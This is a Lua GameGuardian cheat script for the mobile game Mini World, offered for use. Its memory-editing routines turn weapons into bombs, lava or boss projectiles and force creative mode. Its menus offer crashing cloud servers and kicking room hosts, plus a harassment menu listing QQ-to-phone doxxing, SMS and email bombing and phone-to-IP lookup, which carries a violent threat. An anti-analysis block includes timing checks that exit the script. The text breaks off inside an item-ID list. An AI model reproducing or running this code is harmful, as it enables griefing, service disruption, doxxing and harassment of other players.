function BX(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启成功，注入3条数据!")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功\n          共注入 3 条数据")else gg.toast(qmnbn.."开启失败，共注入3条数据!8")end end end

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
-----------防破区-----------
--[[防 LOAD]]for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end
--[[防  -LOG]]timeo=os.clock() logo=debug.traceback(1,nil,((string.char(0,0,0,0,0,0,0,0,0,0,0,0)):rep(9999)):rep(213)) logt=debug.getinfo(1,nil,((string.char(0,0,0,0,0,0,0,0,0,0,0,0)):rep(9999)):rep(213)) logs=load('return gg.searchNumber(((string.char(0,0,0,0,0,0,0,0,0,0,0,0)):rep(999)):rep(999))') logf=debug.getinfo(logs).func() times=os.clock() if times-timeo>0.5 or times-timeo<0.01 then  os.exit()  while true do  end end
--[[防反编译]]Supermem = {} local Y = Y for i, v in ipairs(Supermem) do  if ipairs(M .. v .. "防反编译") == 1 then break end end g={} for index,value in pairs(g) do return value end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end  local You = {} for i, v in pairs(You) do You[i] = v end You.io = {} You.gg = {} You.string = {} for i, v in pairs(io) do You.io[i] = v end for i, v in pairs(string) do You.string[i] = v end for i, v in pairs(gg) do You.gg[i] = v end local Super = {} Super.info = {}		for i, v in ipairs(Super.info) do Super[Super.setsList[i]] = v end function LS(content)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end assert(type(content)=="") local temp={} local result={} local i=1 local ends=0 for i=1, #lines do if string.find(lines[i],"") then table.insert(temp,lines[i]) ends=ends+1 elseif string.find(lines[i],"") or string.find(lines[i],"") or string.find(lines[i],"") then ends=ends+1 if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end elseif string.find(lines[i],"") then ends=ends-1 if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end if ends==0 and #temp~=0 then table.insert(result,temp) temp={} end else if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end end end return result end function Split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function GetAssignment(content) return string.match(content,"") end function isSetGlobals(content) if string.find(content,"") then return true end if string.find(content,"") then return false end return false end function FilteSpec(content) local spec="" for ia=1,string.len(spec) do local suba=""..string.sub(spec,ia,ia) content=(string.gsub(content,""..string.sub(spec,ia,ia),suba)) end return content end function Replace(content,locals) if isSetGlobals(content) then return content end local _i=0 local _v=0 for _i,_v in pairs(locals) do content=(string.gsub(content,_i,FilteSpec(tostring(_v)))) end return content end function process(flines) local spots={} local funnames={} local result="" for i=1, #flines do if type(flines[i])=="" then if flines[i]~="" then name,value=GetAssignment(flines[i]) if name~=nil then if string.find(value,"") then spots[name]=nil result=result..flines[i].."" else spots[name]=Replace(value,spots) end elseif string.find(flines[i],"") then result=result..flines[i].."" local localss=string.match(flines[i],"") local tlocals=Split(localss,",") for j=1,#tlocals do spots[string.match(tlocals[j],"")]="" end else result=result..(Replace(flines[i],spots)).."" end end elseif type(flines[i]=="") then if i~=#flines then if flines[i][1]~=nil and type(flines[i][1]=="") then local funspot=string.match(flines[i][1],"") local funname= string.match(flines[i+1],""..funspot.."") if funname~=nil then flines[i][1]=(string.gsub(flines[i][1],funspot,FilteSpec(funname))) flines[i+1]="" end result=result..process(flines[i]).."" end end end end return result end function raw(s) for w in string.gmatch(s, "") do s=string.gsub(s,""..w,string.char(w),1) end return s end function LO(ina,out)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end file=io.open(ina,"") script=file:read("") file:close() lines=Split(script,"") flines=LS(lines) unraw=process(flines) file=io.open(out,"") file:write(unraw) file:close() final=raw(unraw) file=io.open(out,"") file:write(final) file:close() end function LOO(ina)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end LO(ina,ina) end  ggg = {} for k, v in pairs(gg) do   ggg[k] = v end
-----------------防破区------------------------


gg.alert("该版本为v1.5 beta 加强版")
gg.alert("介绍:该辅助是测试版")

QQ=gg.alert([[
🔰作者天跑禁止二改，倒卖，我的目的是为了做击败迷你，圈钱也只圈那么一点，作者QQ:1764875582，迅速泛滥❗
  ]],'开启','','🔰复制QQ🔰')
if QQ == 3 then gg.copyText("1764875582)") gg.toast("√复制完成√") end

QQ=gg.alert([[
作者天跑禁止二改，倒卖❗❗
  ]],'开启','','♥️复制群号♥️')
if QQ == 3 then gg.copyText("945899865") gg.toast("√复制完成√") end

function CSH()
BX(
{
{4},
{"初始化防闪退"}, 
{16437843, gg.TYPE_DWORD},
{2, 4, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{1637777, 0, gg.TYPE_DWORD, false},
}
)
gg.clearResults()
gg.toast("检索数据中..............")
gg.sleep(690)
BX(
{
{4},
{"初始化修改帧数去除验证"}, 
{124873485, gg.TYPE_DWORD},
{2, 4, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{17555548, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()	 
end 


a = io.open("/sdcard/苏维埃.txt", "rb") if a == nil then user = "" pass = "" else
a = io.open("/sdcard/苏维埃.txt"):read("*a") zh = a:match("账号(.-)账号") if a == "" then zh = "" end end
dI=gg.prompt({"输入你的迷你号","开启初始化（必开）"},{[1] = zh,[2] = true},{[1] = "text",[2] = "checkbox"}) if dI[2] ==true then  CSH() end   zh = dI[1]  io.open("/sdcard/苏维埃.txt", "w") io.open("/sdcard/苏维埃.txt", "w"):write("账号" .. zh .. "账号"):close()
gg.toast("当前迷你号:"..zh.."，一起去旅游了，点击辅助悬浮窗继续")


APP=gg.getTargetInfo()
function Main0()
menu1 = gg.choice({
'炸图区',
'恶心区',
'帮助区',
'无限连跳（秒开秒退）',
'无聊区',
'退出',
}, nil, "做人不能太简单，也不能太讲究 \n当前迷你号:"..zh.."\n当前进程:["..APP.activities[1].label.."]  进程版本:["..APP.versionName.."]\n有些功能来自神圣\n苏维埃辅助总共被启动：" .. qwtjqdcs .. "次")

if menu1 == 1 then A() end
if menu1 == 2 then B() end
if menu1 == 3 then C() end
if menu1 == 4 then WXLTNBNB() end
if menu1 == 5 then YYLJNB() end
if menu1 == 6 then Exit() end
XGCK=0
end

function A()
menu1 = gg.choice({
'生存炸图',
'创造炸图',
'云服炸图',
'next恶心区',
'返回主页',
}, nil, "奥利给")

if menu1 == 1 then SCZT() end
if menu1 == 2 then CZZT() end
if menu1 == 3 then YFZT() end
if menu1 == 4 then B() end
if menu1 == 5 then Main0() end
XGCK=0
end

function B()
menu1 = gg.choice({
'恶心QQ区',
'其他恶心功能（迷你）',
'返回上一页',
}, nil, "天跑nb")

if menu1 == 1 then QQSB() end
if menu1 == 2 then EX2() end
if menu1 == 3 then Main0() end
XGCK=0
end

function QQSB()
  menu1 = gg.multiChoice({
    '查Q绑',
    '反查手机号',
    '轰炸短信',
    '轰炸邮箱',
    '手机号查IP',
    '返回上一页'},
  nil,'警告:不能输入作者的QQ，否则死全家\n炸死他，cao，以社工之力，击碎弟弟')
  if menu1 == nil then else
    if menu1[1] == true then QQSB1() end
    if menu1[2] == true then QQSB2() end
    if menu1[3] == true then QQSB3() end
    if menu1[4] == true then QQSB4() end
    if menu1[5] == true then QQSB5() end
    if menu1[6] == true then B() end
  end
  GLWW=-1
end

function EX2()
  menu1 = gg.multiChoice({
    '删备份',
    '踢房主2.0',
    '踢成员',
    '踢房主1.0',
    '崩云服',
    '附身',
    '免手机打字',
    '无视拉黑',
    '解锁物品',
    '家园25级',
    '伪房主',
    '防踢',
    '返回上一页'},
  nil,'其它功能区')
  if menu1 == nil then else
    if menu1[1] == true then c1() end
    if menu1[2] == true then c2() end
    if menu1[3] == true then c3() end
    if menu1[4] == true then c4() end
    if menu1[5] == true then c5() end
    if menu1[6] == true then c6() end
    if menu1[7] == true then c7() end 
    if menu1[8] == true then c8() end --傻逼
    if menu1[9] == true then c9() end
    if menu1[10] == true then c10() end   
    if menu1[11] == true then c9() end
    if menu1[12] == true then c10() end
    if menu1[13] == true then B() end
  end
  GLWW=-1
end



function SCZT()
  menu1 = gg.multiChoice({
    '解禁地形编辑器',
    '能量剑改地形编辑器',
    '喷射钩爪改地形编辑器',
    '玩法改创造',
    '短剑改黑龙球',
    '仙人掌改炸药桶',
    '传送卷轴（先修改后提取）',
    '水火桶改岩浆',
    '开发者菜单',
    '改创造2.0',
    '编辑器改boos（自然吃屎）',
    '猪蛋改黑龙蛋',
    '仙人掌改桃木图腾（卡房主崩溃）',
     '第八格地形编辑器', 
     '创造背包', 
     '联机取物', 
     '奖杯改炸云服（开启奖杯后再打开）',
    '返回上一页'},
  nil,'他妈之前不行，狗作者终于找到漏洞了')
  if menu1 == nil then else
    if menu1[1] == true then zt1() end
    if menu1[2] == true then zt2() end
    if menu1[3] == true then zt3() end
    if menu1[4] == true then zt4() end
    if menu1[5] == true then zt5() end
    if menu1[6] == true then zt6() end
    if menu1[7] == true then zt7() end
    if menu1[8] == true then zt8() end
    if menu1[9] == true then zt9() end
    if menu1[10] == true then zt10() end
    if menu1[11] == true then zt11() end
    if menu1[12] == true then zt12() end   
    if menu1[13] == true then zt13() end
    if menu1[14] == true then zt14() end
    if menu1[15] == true then zt15() end
    if menu1[16] == true then zt16() end
      if menu1[17] == true then zt17() end     
    if menu1[18] == true then A() end
  end
  GLWW=-1
end


function CZZT()
SN = gg.multiChoice({
"能量剑改巨型炸弹💣（利用变速使房主卡死）",
	 "短剑改熔岩黑龙球",
	 "突刺长枪改毁图生物（配合高频发射器使用）",
	 "石矛改黑龙火球",
	 "牛蛋改岩浆（无视禁止）",
	 "木棒改物理方块(利用变速使地图崩溃)",
	 "石斧改火🔥",
	 "返回主页",
}, nil, "咳咳")
if SN[1]==true then
	 A1()
end
if SN[2]==true then
	 A2()
end
if SN[3]==true then
  A3()
end
if SN[4]==true then
	 A4()
end
if SN[5]==true then
	 A5()
end
if SN[6]==true then
  A6()
end
if SN[7]== true then
  A7()
end
if SN[8]== true then
  A()
end
FX1=0
end

function YFZT()
  menu1 = gg.multiChoice({
    '联机取物（打开奖杯修改，修改后去其他领取）',
    '奖杯其他改火龙球（要打开奖杯再开启）',
    '重启云服（选择一个坐骑云服就无了）',
    '伪装云服服主（需要输入迷你号）',
    '崩云服数据库',
    '崩云服客户端',
    '返回上一页'},
  nil,'以外挂之力，击碎迷你世界')
  if menu1 == nil then else
    if menu1[1] == true then zt16() end
    if menu1[2] == true then zt17() end  
    if menu1[3] == true then yf1() end
    if menu1[4] == true then yf2() end
    if menu1[5] == true then yf3() end
    if menu1[6] == true then yf4() end
    if menu1[7] == true then A() end
  end
  GLWW=-1
end

function A1()
XE(
{
{4},
{"能量剑改巨型炸弹"}, 
{12005, gg.TYPE_DWORD},
{2, 4, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{15518, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
	 Main0()
end

function A2()
XE(
{
{4},
{"短剑改熔岩黑龙球"}, 
{12003, gg.TYPE_DWORD},
{2, 12, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{15056, 0, gg.TYPE_DWORD, false},
}
)
     gg.clearResults()
     Main0()
end

function A3()
XE(
{
{4},
{"突刺长矛改毁图生物"}, 
{12004, gg.TYPE_DWORD},
{2, 12, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{13502, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
     Main0()
end

function A4()
XE(
{
{4},
{"石矛改黑龙球"}, 
{12002, gg.TYPE_DWORD},
{2, 12, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{15054, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
     Main0()
end

function A5()
XE(
{
{4},
{"牛蛋改岩浆"}, 
{13401, gg.TYPE_DWORD},
{2, 8, gg.TYPE_DWORD}, 
{30, 68, gg.TYPE_DWORD}, 
},
{
{6, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
     Main0()
end

function A6()
XE(
{
{4},
{"木棒改物理方块"}, 
{12001, gg.TYPE_DWORD},
{2, 12, gg.TYPE_DWORD}, 
{10, 68, gg.TYPE_DWORD}, 
},
{
{15525, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
     Main0()
end

function A7()
XE(
{
{4},
{"斧矛改火"}, 
{11002, gg.TYPE_DWORD},
{2, 20, gg.TYPE_DWORD}, 
{80, 68, gg.TYPE_DWORD}, 
},
{
{500, 0, gg.TYPE_DWORD, false},
}
)
	 gg.clearResults()
	 Main0()
end

function zt1()
qmnb = {
{["memory"] = 16384},
{["name"] = "解禁地形编辑器开启"},
{["value"] = 1762840583, ["type"] = 4},
{["lv"] = 265295819, ["offset"] = 4, ["type"] = 4},
{["lv"] = 1096303249, ["offset"] = 8, ["type"] = 4},
}
qmxg = {
{["value"] = 0, ["offset"] = 8, ["type"] = 16},
}
xqmnb(qmnb)
end



function zt2()
  gg.clearResults()
  gg.setRanges(4)
  gg.searchNumber("12005", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("10500", gg.TYPE_DWORD)
  gg.toast("能量剑改地形编辑器开启成功")
  gg.clearResults()
end



function zt3()
  gg.clearResults()
  gg.setRanges(4)
  gg.searchNumber("12006", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("10500", gg.TYPE_DWORD)
  gg.toast("喷射钩爪改地形编辑器开启成功")
  gg.clearResults()
end


function zt4()
a = gg.prompt({"请输入房主迷你号:"},
{[1]=1249733234--[[编辑框文字]]},
{[1]="number"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "玩法生存改创造"},
{["value"] = a, ["type"] = 4},
{["lv"] = 5, ["offset"] = -4, ["type"] = 4},
}
qmxg = {
{["value"] = 4, ["offset"] = -4, ["type"] = 4},
}
xqmnb(qmnb)
end

function zt5()
	 gg.clearResults()
	 gg.setRanges(4)
	 gg.searchNumber("12003", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("12003", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 15056}})
 end
	 gg.toast("修改成功重新拿取即可")
	 gg.clearResults()
end

function zt6()
qmnb = {
{["memory"] = 4},
{["name"] = "仙人掌改炸药桶"},
{["value"] = 1731093611, ["type"] = 4},
{["lv"] = 1668246626, ["offset"] = -4, ["type"] = 4},
{["lv"] = 242, ["offset"] = 260, ["type"] = 4},
{["lv"] = 12, ["offset"] = 300, ["type"] = 4},
{["lv"] = 100, ["offset"] = 316, ["type"] = 4},
}
qmxg = {
{["value"] = 834, ["offset"] = 260, ["type"] = 4, ["freeze"] = true},

}
xqmnb(qmnb)
qmnb = {
{["memory"] = 4},
{["name"] = "仙人掌改桃木图腾改炸药桶"},
{["value"] = 1731093611, ["type"] = 4},
{["lv"] = 1668246626, ["offset"] = -4, ["type"] = 4},
{["lv"] = 1049, ["offset"] = 260, ["type"] = 4},
{["lv"] = 12, ["offset"] = 300, ["type"] = 4},
{["lv"] = 100, ["offset"] = 316, ["type"] = 4},
}
qmxg = {
{["value"] = 834, ["offset"] = 260, ["type"] = 4, ["freeze"] = true},

}
xqmnb(qmnb)
end

function zt7()
	 gg.clearResults()
	 gg.setRanges(4)
	 gg.searchNumber("12964", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("12964", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 15054}})
	 end
	 gg.toast("修改成功")
	 gg.clearResults()
end

function zt8()
	 gg.clearResults()
	 gg.setRanges(4)
	 gg.searchNumber("11049", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("11049", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 6}})
	 end
	 gg.toast("修改成功重新拿取即可")
	 gg.clearResults()
end

function zt9()
qmnb = {
{["memory"] = 4},
{["name"] = "开发者"},
{["value"] = 157614080, ["type"] = 4},
{["lv"] = 2, ["offset"] = 28, ["type"] = 4},
}
qmxg = {
{["value"] = 16777472, ["offset"] = 32, ["type"] = 4},
}
xqmnb(qmnb)
gg.toast("再次点击悬浮窗自动恢复")
gg.clearResults()          
   while  true do 
if gg.isVisible(true) then 
gg.setVisible(false)
gg.toast("正在恢复中")
qmnb = {
{["memory"] = 4},
{["name"] = "开发者关闭"},
{["value"] = 157614080, ["type"] = 4},
{["lv"] = 2, ["offset"] = 28, ["type"] = 4},
}
qmxg = {
{["value"] = 16777216, ["offset"] = 32, ["type"] = 4},
}
xqmnb(qmnb)
   while  true do 
if gg.isVisible(true) then 
gg.setVisible(false)
 Main()
end
end
end
end
end

function zt10()
F = gg.alert("🔰请选择｛开 关｝🔰","🍁开🍁","🍁️关🍁️️")
 if  F~=1 and F~=2 then
 gg.toast("你未选择开关默认取消")
    gg.toast("📌你未选择｛开 关｝")
else
end

if  F== 1 then
qmnb={
{["memory"]=16384},
{["name"]="改创造2.0"},
{["value"]=939814400,["type"]=4},
{["lv"]=1187006320,["offset"]=8,["type"]=4},
{["lv"]=939879936,["offset"]=12,["type"]=4}
}
qmxg={
{["value"]=0,["offset"]=4,["type"]=16},
{["value"]=0,["offset"]=-60,["type"]=16},
{["value"]=0,["offset"]=-80,["type"]=16},
{["value"]=0,["offset"]=16,["type"]=16}
}
xqmnb(qmnb)
end
if  F== 2 then
qmnb={
{["memory"]=16384},
{["name"]="创造关"},
{["value"]=939814400,["type"]=4},
{["lv"]=1187006320,["offset"]=8,["type"]=4},
{["lv"]=939879936,["offset"]=12,["type"]=4}
}
qmxg={
{["value"]=13.51617717743,["offset"]=4,["type"]=16},
{["value"]=13.51617717743,["offset"]=-60,["type"]=16},
{["value"]=13.51617717743,["offset"]=-80,["type"]=16},
{["value"]=13.51617717743,["offset"]=16,["type"]=16}
}
xqmnb(qmnb)
end
end

function zt11()
 gg.toast("打开编辑器选择自然方块")
qmnb = {
{["memory"] = 4},
{["name"] = "召唤傻逼东西"},
{["value"] = 4294967410, ["type"] = 32},
{["lv"] = 1065353216, ["offset"] = 0x30, ["type"] = 4},
{["lv"] = 10000, ["offset"] = 0x60, ["type"] = 4},
{["lv"] = 116, ["offset"] = 0x400, ["type"] = 4},
{["lv"] = 117, ["offset"] = 0x600, ["type"] = 4},
}
qmxg = {
{["value"] = 587, ["offset"] = 0, ["type"] = 4},
{["value"] = 588, ["offset"] = 0x400, ["type"] = 4},
{["value"] = 589, ["offset"] = 0x600, ["type"] = 4},
}
xqmnb(qmnb)
end

function zt12()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("13401", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("13401", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 15054}})
	 end
	 gg.toast("修改成功")
	 gg.clearResults()
end

function zt13()
qmnb = {
{["memory"] = 4},
{["name"] = "仙人掌改桃木图腾"},
{["value"] = 1731093611, ["type"] = 4},
{["lv"] = 1668246626, ["offset"] = -4, ["type"] = 4},
{["lv"] = 242, ["offset"] = 260, ["type"] = 4},
{["lv"] = 12, ["offset"] = 300, ["type"] = 4},
{["lv"] = 100, ["offset"] = 316, ["type"] = 4},
}
qmxg = {
{["value"] = 1049, ["offset"] = 260, ["type"] = 4, ["freeze"] = true},

}
xqmnb(qmnb)
qmnb = {
{["memory"] = 4},
{["name"] = "仙人掌改炸药桶改桃木图腾"},
{["value"] = 1731093611, ["type"] = 4},
{["lv"] = 1668246626, ["offset"] = -4, ["type"] = 4},
{["lv"] = 835, ["offset"] = 260, ["type"] = 4},
{["lv"] = 12, ["offset"] = 300, ["type"] = 4},
{["lv"] = 100, ["offset"] = 316, ["type"] = 4},
}
qmxg = {
{["value"] = 1049, ["offset"] = 260, ["type"] = 4, ["freeze"] = true},

}
xqmnb(qmnb)
end

function zt14()
gg.toast("请选择开关")
F = gg.alert("🔰请选择｛开 关｝🔰","🍁开🍁","🍁️关🍁️️")
 if  F~=1 and F~=2 then
 gg.toast("你未选择开关默认取消")
    gg.toast("📌你未选择｛开 关｝")
  else 
  end
if  F== 1 then
gg.clearResults()
qmnb = {
{["memory"] = 4},
{["name"] = "改编辑器"},
{["value"] = 12964, ["type"] = 4},
{["lv"] = 1, ["offset"] = 4, ["type"] = 4},
{["lv"] = 2, ["offset"] = 8, ["type"] = 4},
{["lv"] = 2, ["offset"] = 56, ["type"] = 4},
}
qmxg = {
{["value"] = 10500, ["offset"] = 0, ["type"] = 4},
}
xqmnb(qmnb)
elseif F == 2 then
qmnb = {
{["memory"] = 4},
{["name"] = "第八格地形编辑"},
{["value"] = 10500, ["type"] = 4},
{["lv"] = 1, ["offset"] = 4, ["type"] = 4},
{["lv"] = 2, ["offset"] = 8, ["type"] = 4},
{["lv"] = 2, ["offset"] = 56, ["type"] = 4},
}
qmxg = {
{["value"] = 12964, ["offset"] = 0, ["type"] = 4},
}
xqmnb(qmnb)
end
end

function zt15()
F = gg.alert("🔰请选择｛开 关｝🔰","☠︎开☠︎","☠︎️关☠︎️️")
 if  F~=1 and F~=2 then
 gg.toast("你未选择开关默认取消")
    gg.toast("📌你未选择｛开 关｝")
  else 
  end
if  F== 1 then
qmnb={
{["memory"]=16384},
{["name"]="创造背包开"},
{["value"]=939814400,["type"]=4},
{["lv"]=1187006320,["offset"]=8,["type"]=4},
{["lv"]=939879936,["offset"]=12,["type"]=4}
}
qmxg={
{["value"]=0,["offset"]=-80,["type"]=16}
}
xqmnb(qmnb)
gg.clearResults()
 elseif  F== 2 then
qmnb={
{["memory"]=16384},
{["name"]="创造背包关"},
{["value"]=939814400,["type"]=4},
{["lv"]=1187006320,["offset"]=8,["type"]=4},
{["lv"]=939879936,["offset"]=12,["type"]=4}
}
qmxg={
{["value"]=13.51617717743,["offset"]=-80,["type"]=16}
}
xqmnb(qmnb)
gg.clearResults()
end
end

function zt16()
gg.alert[[
★-----xyg-----★
[武器]15007-罐装手雷
[武器]15008-菠萝手雷
[投射物]15050-投射物-野人猎手
[投射物]15051-投射物-硫黄弓手
[投射物]15052-投射物-小恶魔
[投射物]15053-投射物-野生团子
[投射物]15054-投射物-黑龙火球
[投射物]15055-投射物-黑龙熔岩石柱
[投射物]15056-投射物-黑龙熔岩球
[投射物]15057-投射物-黑龙混乱球
[投射物]15058-投射物-小外星人A
[投射物]15059-投射物-小外星人B
[投射物]15060-投射物-小外星人C
[投射物]15061-投射物-萌眼叮叮
[投射物]15062-投射物-萌眼咚咚
[投射物]15063-投射物-萌眼当当
[投射物]15064-投射物-萌眼叮咚
[投射物]15065-投射物-萌眼叮当
[投射物]15066-投射物-萌眼咚当
[投射物]15067-投射物-萌眼咻咻
[投射物]15068-投射物-混乱弓手
[投射物]15069-投射物-远程守卫
[投射物]15070-投射物-远程守卫
[投射物]15071-投射物-远程守卫
[武器]15505-虚空巨石
[武器]15506-圆球爆弹
[武器]15507-冰锥
[武器]15508-熔岩球
[投射物]15509-萌眼星BOSS-击飞激光
[投射物]15510-萌眼星BOSS-冰冻激光
[投射物]15511-萌眼星BOSS-爆炸激光
[投射物]15512-萌眼星BOSS-岩石海啸
[投射物]15513-萌眼星BOSS-蓝色手臂技能
[投射物]15514-萌眼星BOSS-白色手臂技能
[投射物]15515-萌眼星BOSS精英怪-蓝色投掷
[投射物]15516-萌眼星BOSS精英怪-白色投掷
[投射物]15517-萌眼星BOSS精英怪-蓝色技能
[投射物]15518-萌眼星BOSS精英怪-白色技能
[武器]15519-黑龙熔岩球
[武器]15520-黑龙混乱球
---投  射  物---
12299擎天柱炮弹
12300星星弹
15509燃烧激光
